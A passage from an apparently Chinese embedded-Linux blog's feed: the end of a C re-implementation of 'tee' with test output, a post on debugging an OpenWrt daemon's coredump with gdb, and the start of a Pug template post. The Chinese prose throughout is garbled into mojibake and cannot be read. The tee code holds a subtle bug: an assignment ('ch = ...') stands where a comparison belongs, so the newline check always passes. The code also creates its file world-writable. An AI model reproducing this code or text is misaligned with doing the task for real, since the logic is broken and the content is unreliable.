    char buffer[BUF_SIZE] = {0};
    char ch;

    fflush(stdin);
    fflush(stdout);
    while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0){ // read from stdin
        buffer[i++] = ch;
        if(ch = &#39;\n&#39; || i == BUF_SIZE){
            write(STDOUT_FILENO, buffer, i); // output to stdout
            if(fd &gt; 0) write(fd, buffer, i);
            memset(buffer, 0, sizeof(buffer));
            i = 0;
        }
    }
}
</code></pre>
<p><code>STDIN_FILENO</code>, <code>STDOUT_FILENO</code>åˆ†åˆ«å¯¹åº”æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æè¿°ç¬¦<code>0</code>, <code>1</code>ã€‚è¿™ä¸¤ä¸ªåŠ ä¸Šæ ‡å‡†é”™è¯¯è¾“å‡º<code>STDERR_FILENO</code>æ˜¯æ‰€æœ‰åº”ç”¨ç¨‹åºé»˜è®¤æ‰“å¼€çš„ï¼Œæ‰€ä»¥æ— éœ€æ‰‹åŠ¨<code>open</code>ã€‚</p>
<p>æ­¤å¤–ï¼Œè¾“å‡ºå‡½æ•°<code>output</code>ä¼šåˆ¤æ–­ä¼ å…¥çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæ— æ•ˆåˆ™ä¸ä¼šå†™å…¥æ–‡ä»¶ï¼Œä»…å°†æ•°æ®è¾“å‡ºè‡³æ ‡å‡†è¾“å‡ºã€‚</p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;

#define BUF_SIZE 512
#define VERSION &quot;litreily 1.0.0&quot;

void output(int fd)
{
    int i = 0;
    char buffer[BUF_SIZE] = {0};
    char ch;

    fflush(stdin);
    fflush(stdout);
    while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0){
        buffer[i++] = ch;
        if(ch = &#39;\n&#39; || i == BUF_SIZE){
            write(STDOUT_FILENO, buffer, i); // output to stdout
            if(fd &gt; 0) write(fd, buffer, i);
            memset(buffer, 0, sizeof(buffer));
            i = 0;
        }
    }
}

void usage(){
    printf(&quot;Usage: tee [OPTION]... [FILE]\n&quot;
        &quot;Copy standard input to each FILE, and also to standard output.\n\n&quot;
        &quot;  -a, --append   append to the given FILEs, do not overwrite\n&quot;
        &quot;  -v, --version  output version information and exit\n&quot;
        &quot;      --help     display this help and exit\n&quot;
    );
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    int opt, fd = -1;
    int flag_append = 0;
    int flags = O_WRONLY | O_CREAT;

    struct option opts[] = {
        {&quot;append&quot;, 0, NULL, &#39;a&#39;},
        {&quot;help&quot;, 0, NULL, &#39;h&#39;},
        {&quot;version&quot;, 0, NULL, &#39;v&#39;}
    };

    while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1) {
        switch(opt){
            case &#39;a&#39;:
                flag_append = 1;
                break;
            case &#39;h&#39;:
                usage();
                break;
            case &#39;v&#39;:
                printf(VERSION&quot;\n&quot;);
                exit(EXIT_FAILURE);
                break;
            case &#39;?&#39;:
                printf(&quot;tee: invaild option -- &#39;%c&#39;\n&quot;
                    &quot;Try &#39;tee --help&#39; for more infomation.\n&quot;, optopt);
            default:
                exit(EXIT_FAILURE);
                break;
        }
    }

    if(optind &lt; argc){
        flags += flag_append ? O_APPEND:O_TRUNC;
        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(fd == -1){
            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);
            exit(EXIT_FAILURE);
        }
    }

    output(fd);
    if(fd &gt; 0)
        close(fd);

    return 0;
}
</code></pre>
<h2 id="æŒ‡ä»¤æµ‹è¯•"><a href="#æŒ‡ä»¤æµ‹è¯•" class="headerlink" title="æŒ‡ä»¤æµ‹è¯•"></a>æŒ‡ä»¤æµ‹è¯•</h2><p>ä½¿ç”¨<code>gcc</code>å®Œæˆç¼–è¯‘ï¼Œå¾—åˆ°<code>tee</code>å¯æ‰§è¡Œæ–‡ä»¶</p>
<pre><code class="sh">gcc tee.c -o tee
</code></pre>
<p>ä¸‹é¢å¯¹æŒ‡ä»¤è¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="sh">$ ./tee --help
Usage: tee [OPTION]... [FILE]
Copy standard input to each FILE, and also to standard output.

  -a, --append   append to the given FILEs, do not overwrite
  -v, --version  output version information and exit
      --help     display this help and exit
$ ./tee --version
litreily 1.0.0
$ ./tee -h
tee: invaild option -- &#39;h&#39;
Try &#39;tee --help&#39; for more infomation.
$ ./tee -v
litreily 1.0.0
$ ./tee -a -d
tee: invaild option -- &#39;d&#39;
Try &#39;tee --help&#39; for more infomation.
$ ./tee test.txt
1
1
22
22
$ cat test.txt
1
22
$ ./tee -a test.txt
4444
4444
55555
55555
$ cat test.txt
1
22
4444
55555
$ ls | ./tee test.txt
main.c
Makefile
README.md
tee
tee.c
test.txt
$ cat test.txt
main.c
Makefile
README.md
tee
tee.c
test.txt
</code></pre>
<h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><ol>
<li><a href="http://man.linuxde.net/tee" target="_blank" rel="noopener">teeå‘½ä»¤</a></li>
<li><a href="http://blog.zhangjikai.com/2016/03/05/%E3%80%90C%E3%80%91%E8%A7%A3%E6%9E%90%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0--getopt%E5%92%8Cgetopt_long/" target="_blank" rel="noopener">è§£æå‘½ä»¤è¡Œå‚æ•°--getoptå’Œgetopt_long</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OpenWrtä¸­ä½¿ç”¨gdbåˆ†æcoredump]]></title>
      <url>https://www.litreily.top/2018/09/20/coredump/</url>
      <content type="html"><![CDATA[<p>è¿‘æ—¥è°ƒè¯•ä¸€ä¸ª<code>bug</code>ï¼Œä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹åœ¨ç‰¹å®šæƒ…å†µä¸‹æ‰§è¡Œä¸€æ®µç¨‹åºåä¾¿ä¼šæŒ‚æ‰ã€‚ä¸ºäº†åˆ†æ<code>bug</code>äº§ç”ŸåŸå› ï¼Œæœ¬äººä½¿ç”¨äº†printf, straceè¿½è¸ªï¼Œgdbè°ƒè¯•ç­‰è¯¸å¤šè°ƒè¯•å·¥å…·å’Œæµ‹è¯•æ–¹æ³•ã€‚æœ¬æ–‡å¯¹äºåœ¨<code>OpenWrt</code>åµŒå…¥å¼ç³»ç»Ÿä¸­å¯ç”¨<code>gdb</code>åŠŸèƒ½åŠå…¶ä½¿ç”¨æ–¹æ³•è¿›è¡Œè¯¦ç»†è¯´æ˜ã€‚</p>
<h2 id="è°ƒè¯•èƒŒæ™¯"><a href="#è°ƒè¯•èƒŒæ™¯" class="headerlink" title="è°ƒè¯•èƒŒæ™¯"></a>è°ƒè¯•èƒŒæ™¯</h2><p>æˆ‘æœ€å…ˆé€šè¿‡<code>strace</code>å·¥å…·è¿½è¸ªå‘ç°è¿›ç¨‹æ˜¯åœ¨æ”¶åˆ°<code>SIGABRT</code>ä¿¡å·åè¢«<code>kill</code>çš„ã€‚</p>
<pre><code class="c">pipe([8, 9])                            = 0
fcntl64(8, F_GETFL)                     = 0 (flags O_RDONLY)
ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbe90a454) = -1 EINVAL (Invalid argument)
rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
tgkill(14189, 14189, SIGABRT)             = 0
--- SIGABRT (Aborted) @ 0 (0) ---
Process 14189 detached
</code></pre>
<p>ç”±ä»¥ä¸Šä¿¡æ¯å¯çŸ¥ï¼Œè¿›ç¨‹åœ¨æ‰§è¡ŒæŸä¸ªç®¡é“<code>pipe</code>ç›¸å…³æ“ä½œæ—¶è¢«<code>kill</code>ï¼Œé€šå¸¸æ˜¯åœ¨æ‰§è¡Œ<code>popen</code>å‡½æ•°ä¼šå‡ºç°<code>pipe</code>è°ƒç”¨ã€‚ä¹‹åå¯¹æºç <code>grep -rn popen</code>ï¼Œ å¹¶ç»“åˆ<code>strace</code>æ‰“å°çš„å‡ºé”™å‰çš„ä¿¡æ¯å¯ä»¥å¤§è‡´å®šä½åˆ°å¯èƒ½å‡ºé”™çš„ä½ç½®ï¼Œç„¶åé€šè¿‡æ·»åŠ <code>printf</code>æ‰“å°<code>log</code>ï¼Œæ ¹æ®é‡ç°æ—¶åœæ­¢æ‰“å°<code>log</code>çš„åœ°æ–¹ç²¾ç¡®å®šä½åˆ°æºç å‡ºé”™ä½ç½®ã€‚</p>
<pre><code class="C">// config.c
char * config_get(char *name) {
    FILE *fp;
    char cmd[128]={0};
    snprintf(cmd, sizeof(cmd)-1, &quot;config get %s&quot;, name);
    fp = popen(cmd, &quot;r&quot;);   // å‡ºé”™ä½ç½®
    // ...
}
</code></pre>
<p>è‡³æ­¤ï¼Œä»…ä»…èƒ½åˆ¤æ–­å‡ºç”¨æˆ·æ€çš„å‡ºé”™ä½ç½®ï¼Œä½†ä»æ­¤å¤„ä»£ç å°šæ— æ³•æ˜ç¡®å‡ºé”™çš„æ ¹æœ¬åŸå› ï¼Œè¿˜éœ€æŠ“å–å†…æ ¸æ€çš„å‡ºé”™ä¿¡æ¯ï¼Œæ­¤æ—¶ä¾¿éœ€è¦ä½¿ç”¨<code>GDB</code>å¯¹è¿›ç¨‹å‡ºé”™æ—¶ç³»ç»Ÿç”Ÿæˆçš„<code>coredump</code>æ–‡ä»¶è¿›è¡Œåˆ†æäº†ã€‚</p>
<h2 id="ç¼–è¯‘gdbä»¥åŠå¸¦symbolsçš„ç¨‹åº"><a href="#ç¼–è¯‘gdbä»¥åŠå¸¦symbolsçš„ç¨‹åº" class="headerlink" title="ç¼–è¯‘gdbä»¥åŠå¸¦symbolsçš„ç¨‹åº"></a>ç¼–è¯‘gdbä»¥åŠå¸¦symbolsçš„ç¨‹åº</h2><p>åœ¨åˆ†æä¹‹å‰ï¼Œéœ€è¦è¢«è°ƒè¯•è¿›ç¨‹çš„äºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«<code>GDB</code>åˆ†ææ‰€éœ€çš„<code>symbols</code>ï¼Œä»€ä¹ˆæ˜¯<code>symbols</code>? ç²—ç•¥çš„è®²ï¼Œå°±æ˜¯ä¸€å¼ åµŒå…¥å¾…è°ƒè¯•è¿›ç¨‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ˜ å°„è¡¨ï¼ŒåŒ…å«ä»£ç ä¸­çš„å˜é‡ã€å‡½æ•°åã€è¡Œå·ç­‰ä¿¡æ¯ã€‚è¯¦è§<a href="https://www.tutorialspoint.com/gnu_debugger/gdb_debugging_symbols.htm" target="_blank" rel="noopener">GDB-Debugging Symbols</a></p>
<h3 id="é…ç½®ç¼–è¯‘å‚æ•°"><a href="#é…ç½®ç¼–è¯‘å‚æ•°" class="headerlink" title="é…ç½®ç¼–è¯‘å‚æ•°"></a>é…ç½®ç¼–è¯‘å‚æ•°</h3><p><code>OpenWrt</code>ç¼–è¯‘å‚æ•°å­˜äº<code>.config</code>æ–‡ä»¶ä¸­ï¼Œ<code>OpenWrt</code>é»˜è®¤å¹¶æœªæ‰“å¼€<code>gdb</code>åŠŸèƒ½ä»¥åŠ<code>debug</code>è°ƒè¯•åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>make menuconfig</code>é€‰æ‹©å‚æ•°æˆ–è€…æ‰‹åŠ¨æ›´æ”¹é…ç½®æ–‡ä»¶ã€‚</p>
<pre><code class="sh"># .config
CONFIG_DEBUG=y # ä½¿èƒ½è°ƒè¯•åŠŸèƒ½ï¼Œå¯ç”¨åä¼šç»™é›†æˆGDBè°ƒè¯•æ‰€éœ€çš„symbols
CONFIG_NO_STRIP=y # ç¦ç”¨stripï¼Œé˜²æ­¢ç¨‹åºä»£ç è¢«æ‰“ä¹±
#CONFIG_USE_SSTRIP=y
CONFIG_TOOLCHAINOPTS=y # ä½¿èƒ½äº¤å‰å·¥å…·é“¾å¯é€‰åŠŸèƒ½ï¼Œè¿™æ˜¯ç¼–è¯‘GDBåŠŸèƒ½çš„æ€»å¼€å…³
</code></pre>
<p>é…ç½®å®Œæˆåé‡æ–°ç¼–è¯‘äº¤å‰å·¥å…·é“¾ï¼Œç”¨ä»¥å¾—åˆ°<code>gdb</code>å·¥å…·</p>
<pre><code class="sh">make toolchain/{compile,install} V=s
</code></pre>
<h3 id="ç¼–è¯‘å•ä¸ªæ¨¡å—-package"><a href="#ç¼–è¯‘å•ä¸ªæ¨¡å—-package" class="headerlink" title="ç¼–è¯‘å•ä¸ªæ¨¡å—(package)"></a>ç¼–è¯‘å•ä¸ªæ¨¡å—(package)</h3><p>å‚è€ƒ<code>OpenWrt</code>å®˜æ–¹<a href="https://wiki.openwrt.org/doc/devel/gdb?s[]=gdb" target="_blank" rel="noopener">æ–‡æ¡£</a>ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å•ç‹¬ä¸ºä¸€ä¸ªæ¨¡å—æ·»åŠ <code>debug symbols</code></p>
<pre><code class="sh">make package/traffic_meter/{clean,compile,install} V=99 CONFIG_DEBUG=y
</code></pre>
<h3 id="å®Œæ•´ç¼–è¯‘"><a href="#å®Œæ•´ç¼–è¯‘" class="headerlink" title="å®Œæ•´ç¼–è¯‘"></a>å®Œæ•´ç¼–è¯‘</h3><p>å¦‚æœå°†å…¨å±€<code>debug</code>å¼€å¯ï¼Œå¹¶è¿›è¡Œå®Œæ•´ç¼–è¯‘ï¼Œè¿™ä¼šå¯¼è‡´<code>image</code>è¿‡å¤§ï¼ˆ&gt;300Mï¼‰è€Œç¼–è¯‘å¤±è´¥ã€‚å½“ç„¶å•¦ï¼Œç¼–è¯‘å¤±è´¥ä¸è¦ç´§ï¼Œå› ä¸ºåªæ˜¯æ²¡æœ‰ç”Ÿæˆ<code>image</code>æ–‡ä»¶ï¼Œä½†æ˜¯æ‰€éœ€æ¨¡å—å’ŒåŠ¨æ€é“¾æ¥åº“éƒ½èƒ½æ­£å¸¸ç¼–è¯‘å®Œæˆï¼Œå¹¶ä¸å½±å“<code>coredump</code>æ–‡ä»¶çš„åˆ†æã€‚</p>
<p>ä¸è¿‡å®Œæ•´ç¼–è¯‘å¤ªè¿‡è´¹æ—¶ï¼Œä¸æ¨èï¼Œè¿˜æ˜¯å¯¹éœ€è¦è°ƒè¯•çš„å•ä¸ªæ¨¡å—è¿›è¡Œç¼–è¯‘æ¯”è¾ƒå¿«æ·å’Œæ–¹ä¾¿ã€‚</p>
<h2 id="è·å–coredump"><a href="#è·å–coredump" class="headerlink" title="è·å–coredump"></a>è·å–coredump</h2><p>å¾—åˆ°äº†å¸¦æœ‰<code>symbols</code>çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»¥åŠäº¤å‰ç¼–è¯‘å¾—åˆ°çš„<code>gdb</code>è°ƒè¯•å·¥å…·ï¼Œå‰©ä¸‹çš„å°±æ˜¯è·å–<code>coredump</code>æ–‡ä»¶</p>
<h3 id="é…ç½®coredumpå‚æ•°"><a href="#é…ç½®coredumpå‚æ•°" class="headerlink" title="é…ç½®coredumpå‚æ•°"></a>é…ç½®coredumpå‚æ•°</h3><pre><code class="sh">$ sudo vi /etc/profile
# åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ä»¥ä¸‹æŒ‡ä»¤ï¼Œä»¥å–æ¶ˆå¯¹coredumpæ–‡ä»¶å¤§å°çš„é™åˆ¶
ulimit -c unlimited
$ source /etc/profile

# è®¾ç½®coredumpæ–‡ä»¶å‘½åæ ¼å¼
# e - process name; p - pid; t - time
$ echo &quot;core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern
</code></pre>
<p>å…³äº<code>coredump</code>æ–‡ä»¶æ ¼å¼çš„å‚æ•°è¯´æ˜ï¼Œå¯ä»¥å‚è€ƒ<a href="http://man7.org/linux/man-pages/man5/core.5.html" target="_blank" rel="noopener">core dump file</a></p>
<h3 id="é‡ç°bugå¹¶è·å–coredumpæ–‡ä»¶"><a href="#é‡ç°bugå¹¶è·å–coredumpæ–‡ä»¶" class="headerlink" title="é‡ç°bugå¹¶è·å–coredumpæ–‡ä»¶"></a>é‡ç°bugå¹¶è·å–coredumpæ–‡ä»¶</h3><p>é¦–å…ˆé‡ç°bugï¼Œç„¶åæ‰¾åˆ°<code>coredump</code>æ–‡ä»¶ï¼Œå¹¶ä¼ è‡³ç¼–è¯‘æœåŠ¡å™¨</p>
<pre><code class="sh">$ cd /
$ find . -name &quot;core-*&quot; |grep traffic_meter
./sbin/core-traffic_meter-14189-2895
$ cd sbin
$ tftp -pl core-traffic_meter-14189-2895 192.168.1.10
</code></pre>
<h2 id="GDBè°ƒè¯•"><a href="#GDBè°ƒè¯•" class="headerlink" title="GDBè°ƒè¯•"></a>GDBè°ƒè¯•</h2><h3 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h3><p>ä¸‹é¢æ˜¯å¸¸ç”¨çš„å‡ ä¸ª<code>gdb</code>æŒ‡ä»¤</p>
<pre><code class="sh">(gdb) help
(gdb) where
(gdb) bt    # backtrace
(gdb) list  # [l] æ˜¾ç¤ºå½“å‰è°ƒè¯•å¤„çš„ç›¸å…³ä»£ç 
(gdb) up [num]  # å‘ä¸Šè·³è½¬1ä¸ªæˆ–numä¸ªbt
(gdb) down [num]    # å‘ä¸‹è·³è½¬1ä¸ªæˆ–numä¸ªbt
(gdb) print [variable]  # [p] æ‰“å°å½“å‰è°ƒè¯•å¤„ç›¸å…³å˜é‡çš„å€¼
</code></pre>
<h3 id="è°ƒè¯•å®ä¾‹"><a href="#è°ƒè¯•å®ä¾‹" class="headerlink" title="è°ƒè¯•å®ä¾‹"></a>è°ƒè¯•å®ä¾‹</h3><pre><code class="sh">$ cd repo.git
$ cd build_dir/target-arm_v7=a_uClibc-0.9.33.2_eabi/root-ipq806x
$ ../../toolchain-arm_v7-a_gcc-4.6-linaro_uClibc-0.9.33.2_eabi/gdb-linaro-7.2-2011.03-0/gdb/gdb sbin/traffic_meter ~/core-traffic_meter-14189-28959-2895
GNU gdb (Linaro GDB) 7.2-2011.03-0
Copyright (C) 2010 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;--host=x86_64-linux-gnu --target=arm-openwrt-linux-uclibcgnueabi&quot;.
For bug reporting instructions, please see:
&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/sbin/traffic_meter...done.

warning: exec file is newer than core file.
[New Thread 14189]
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libgcc_s.so.1...done.
Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libgcc_s.so.1
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libc.so.0...done.
Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libc.so.0
Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/ld-uClibc.so.0...done.
Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/ld-uClibc.so.0
Core was generated by `traffic_meter -w brwan -p ppp0 -m /dev/mtd15`.
Program terminated with signal 6, Aborted.
#0  0x402fb4fc in raise (sig=6) at libpthread/nptl/sysdeps/unix/sysv/linux/raise.c:67
67        int res = INLINE_SYSCALL (tgkill, 3, pid, selftid, sig);
(gdb) bt
#0  0x402fb4fc in raise (sig=6) at libpthread/nptl/sysdeps/unix/sysv/linux/raise.c:67
#1  0x402f579c in abort () at libc/stdlib/abort.c:89
#2  0x402f5060 in __malloc_consolidate (av=0x4030b3e8) at libc/stdlib/malloc-standard/free.c:234
#3  __malloc_consolidate (av=0x4030b3e8) at libc/stdlib/malloc-standard/free.c:170
#4  0x402f4854 in malloc (bytes=&lt;value optimized out&gt;) at libc/stdlib/malloc-standard/malloc.c:908
#5  0x402d6250 in _stdio_fopen (fname_or_mode=&lt;value optimized out&gt;, mode=&lt;value optimized out&gt;, stream=0x8ca0e8, filedes=8) at libc/stdio/_fopen.c:177
#6  0x402d4fb4 in popen (command=0x8 &lt;Address 0x8 out of bounds&gt;, modes=0xfc08 &quot;r&quot;) at libc/stdio/popen.c:83
#7  0x0000f488 in config_get (name=&lt;value optimized out&gt;) at config.c:11
#8  0x0000ed48 in get_bogus_time_region (ct=60744, st=0xbe9f8994, btr=0xbe9f896c) at util.c:184
#9  0x0000e8f0 in get_traffic_from_flash (tfm=0xbe9f8738, ct=2894) at spi_flash.c:912
#10 0x0000ccb0 in restart_traffic_counter (tfm=0xbe9f8738, ct=52400) at trafficmeter.c:976
#11 0x0000a1f4 in main (argc=&lt;value optimized out&gt;, argv=&lt;value optimized out&gt;) at trafficmeter.c:1798
(gdb)
</code></pre>
<blockquote>
<p><strong>BackTrace (bt) è¾“å‡º</strong>  </p>
<p>#num memory_addr in function (arg1=val1, arg2=val2,...) at file.c:line<br><code>bt</code>è¾“å‡ºå‰é¢çš„ç¼–å·æ˜¯è¿›ç¨‹æ‰§è¡Œæ—¶çš„å‹æ ˆé¡ºåºï¼Œç¼–å·è¶Šå°è¶Šåº•å±‚ã€‚ç¼–å·åé¢ç´§è·Ÿçš„æ˜¯å†…å­˜åœ°å€ï¼Œä»åœ°å€å¤§å°å¯ä»¥çœ‹å‡ºå“ªäº›æ˜¯å†…æ ¸è°ƒç”¨ï¼Œå“ªäº›æ˜¯ç”¨æˆ·è°ƒç”¨ã€‚  </p>
<p><strong>æ³¨æ„ï¼š</strong>ç”±äºç¼–è¯‘å™¨ä¼˜åŒ–ç¼˜æ•…ï¼ŒæŸäº›å˜é‡ä¼šæ˜¾ç¤º<code>value optimized out</code>ï¼Œå¦‚æœæƒ³è·å–çœŸå®å€¼ï¼Œéœ€è¦åœ¨ç¼–è¯‘æ—¶æ·»åŠ <code>-O0</code>ï¼Œç”¨ä»¥ç¦ç”¨ç¼–è¯‘å™¨ä¼˜åŒ–</p>
</blockquote>
<p>ä»<code>bt</code>ç»“æœå¯ä»¥çœ‹å‡ºï¼Œè¿›ç¨‹æ˜¯åœ¨æ‰§è¡ŒåŠ¨æ€å†…å­˜åˆ†é…å‡½æ•°<code>malloc</code>æ—¶æ£€æµ‹åˆ°é”™è¯¯ï¼Œå¹¶æ‰§è¡Œ<code>abort</code>å‡½æ•°è§¦å‘<code>SIGABRT</code>ä¿¡å·åé€€å‡ºçš„ã€‚é‚£å°±å¯ä»¥ç¡®å®šæ˜¯å†…å­˜é—®é¢˜ï¼Œå¤šåŠæ˜¯å†…å­˜å¤šæ¬¡é‡Šæ”¾æˆ–æ˜¯æœªé‡Šæ”¾å¯¼è‡´çš„ã€‚</p>
<p>æ®æ­¤çº¿ç´¢ï¼Œæ£€æŸ¥ä»£ç ä¸­ä¸å†…å­˜åˆ†é…å’Œé‡Šæ”¾ç›¸å…³çš„éƒ¨åˆ†ï¼Œæœ€ç»ˆè°ƒè¯•å‘ç°æ˜¯æŸå¤„ä»£ç å¼•ç”¨æŒ‡é’ˆé”™è¯¯ï¼Œå¹¶åœ¨ä¹‹åä½¿ç”¨<code>free</code>é‡Šæ”¾å†…å­˜ï¼Œè€Œè¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨å¤šå¤„åœ°æ–¹è¢«é‡æ–°åˆ†é…å’Œé‡Šæ”¾ï¼Œå¯¼è‡´å†…å­˜å‡ºç°ä¸å¯é¢„æ–™çš„é—®é¢˜ã€‚</p>
<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>åœ¨åˆ†æ<code>coredump</code>æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>äº¤å‰ç¼–è¯‘åçš„<code>GDB</code>å¯æ‰§è¡Œæ–‡ä»¶ä½äº<code>build_dir/toolchain-arm_v7-a_gcc-4.6-linaro_uClibc-0.9.33.2_eabi/gdb-linaro-7.2-2011.03-0/gdb/gdb</code></li>
<li>æ³¨æ„å½“å‰è°ƒè¯•è·¯å¾„æœ€å¥½æ˜¯åœ¨ç¼–è¯‘å®Œæˆåçš„æ ¹ç›®å½•<code>root-ipq806x</code>, å¦åˆ™<code>GDB</code>å¯èƒ½æ— æ³•æ‰¾åˆ°åŠ¨æ€é“¾æ¥åº“çš„ä½ç½®ï¼Œä»è€Œæ— æ³•æ‰¾åˆ°åº“å‡½æ•°çš„<code>symbols</code>ï¼Œæ­¤æ—¶å¯èƒ½å‡ºç°ä»¥ä¸‹æƒ…å†µ</li>
</ol>
<pre><code class="sh">warning: exec file is newer than core file.
[New Thread 14189]

warning: Could not load shared library symbols for 3 libraries, e.g. /lib/libgcc_s.so.1.
Use the &quot;info sharedlibrary&quot; command to see the complete listing.
Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?

warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
Core was generated by `traffic_meter -w brwan -p ppp0 -m /dev/mtd15`.
Program terminated with signal 6, Aborted.
#0  0x402fb4fc in ?? ()
Setting up the environment for debugging gdb.
Function &quot;internal_error&quot; not defined.
Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
Function &quot;info_command&quot; not defined.
Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
.gdbinit:8: Error in sourced command file:
Argument required (one or more breakpoint numbers).
(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
                        No          /lib/libgcc_s.so.1
                        No          /lib/libc.so.0
                        No          /lib/ld-uClibc.so.0
(gdb) bt
#0  0x402fb4fc in ?? ()
#1  0x402f579c in ?? ()
#2  0x402f579c in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
</code></pre>
<p>è‹¥å‡ºç°ä»¥ä¸Šæƒ…å†µï¼Œæˆ‘ä»¬å¾—ä¸åˆ°ä»»ä½•æœ‰æ•ˆä¿¡æ¯ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡æç¤ºçš„<code>set solib-search-path</code>æˆ–<code>set sysroot</code>æ‰‹åŠ¨è®¾ç½®åº“è·¯å¾„æˆ–æ ¹ç›®å½•è·¯å¾„ã€‚ä½†æˆ‘ä»å»ºè®®åœ¨è°ƒè¯•å‰<code>cd</code>åˆ°æ ¹ç›®å½•ã€‚</p>
<h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><ol>
<li><a href="https://blog.51cto.com/terrytong914/1905041" target="_blank" rel="noopener">Linux coredumpè§£å†³æµç¨‹</a></li>
<li><a href="https://wiki.openwrt.org/doc/devel/gdb?s[]=gdb" target="_blank" rel="noopener">GNU Debugger</a></li>
<li><a href="https://www.tutorialspoint.com/gnu_debugger/gdb_debugging_symbols.htm" target="_blank" rel="noopener">GDB - Debugging Symbols</a></li>
<li><a href="http://man7.org/linux/man-pages/man5/core.5.html" target="_blank" rel="noopener">Core dump file</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç½‘é¡µæ¨¡æ¿pugåŸºæœ¬è¯­æ³•]]></title>
      <url>https://www.litreily.top/2018/08/31/pug-synax/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Pug â€“ robust, elegant, feature rich template engine for Node.js</p>
</blockquote>
